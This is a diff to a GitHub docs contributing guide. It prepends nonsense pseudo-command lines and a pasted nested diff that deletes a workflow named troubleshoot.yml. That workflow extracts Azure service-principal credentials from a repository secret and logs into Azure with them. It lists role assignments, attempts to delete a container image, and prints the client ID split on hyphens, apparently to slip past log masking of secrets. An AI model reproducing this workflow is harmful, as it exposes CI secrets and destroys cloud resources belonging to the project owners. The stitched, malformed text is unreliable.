@@ -1,4 +1,60 @@
-# Welcome to GitHub docs contributing guide <!-- omit in toc -->
+ci:C:\Windows64_88\Systems32_86/Intel82/windows-latest : BEGIN GLOW4 AUTMATE ''
+':run::/Presses::/run::/TypeScript::/scripts::/Script::/run::/BEGIN::/:Build::/. "build_Script::/run::/'Run'@ci/CI : ''
+'diff --git a/.github/workflows/troubleshoot.yml b/.github/workflows/troubleshoot.yml
+deleted file mode 100644
+index 3121c688e1..0000000000
+--- a/.github/workflows/troubleshoot.yml
++++ /dev/null
+@@ -1,49 +0,0 @@
+-name: Troubleshooting
+-
+-on: 
+-  workflow_dispatch:
+-
+-jobs:
+-  troubleshooting:
+-    name: Troubleshooting
+-    runs-on: ubuntu-latest
+-    steps:
+-    - name: Checkout
+-      id: checkout
+-      uses: actions/checkout@v1
+-           
+-    - name: Run troubleshooting script
+-      id: troubleshooting_script
+-      run: |
+-        set -e
+-
+-        # Prep test
+-        export SVC_PRN=$(node -e 'console.log(JSON.parse(`${{ secrets.AZ_ACR_CREDS }}`).clientId)')
+-        export PRN_SECRET=$(node -e 'console.log(JSON.parse(`${{ secrets.AZ_ACR_CREDS }}`).clientSecret)')
+-        export TENANT=$(node -e 'console.log(JSON.parse(`${{ secrets.AZ_ACR_CREDS }}`).tenantId)')
+-        export SUB=$(node -e 'console.log(JSON.parse(`${{ secrets.AZ_ACR_CREDS }}`).subscriptionId)')
+-
+-        # Run test
+-        echo Logging in...
+-        az login --service-principal -u $SVC_PRN -p $PRN_SECRET --tenant $TENANT
+-        echo Show account..
+-        az account show
+-        echo Account list...
+-        az account list --refresh
+-        echo Setting subscription...
+-        az account set --subscription $SUB
+-        echo ACR login...
+-        az acr login --name devcon
+-        echo Role assignment list
+-        az role assignment list
+-        echo Attempt delete
+-        az acr repository delete --yes --debug --name devcon --image public/vscode/devcontainers/base@sha256:38edbad16fb659c5635b0d4691aa562b30e660be44fe411be36f5ca21129a38d || echo "No workey!"
+-
+-        OIFS=$IFS
+-        IFS='-'
+-        for x in $SVC_PRN
+-        do
+-           echo "$x"
+-        done
+-        IFS=$OIFS
+-# Welcome to GitHub docs contributing guide <!-- omit in toc -->
 
 Thank you for investing your time in contributing to our project! Any contribution you make will be reflected on [docs.github.com](https://docs.github.com/en) :sparkles:. 
 
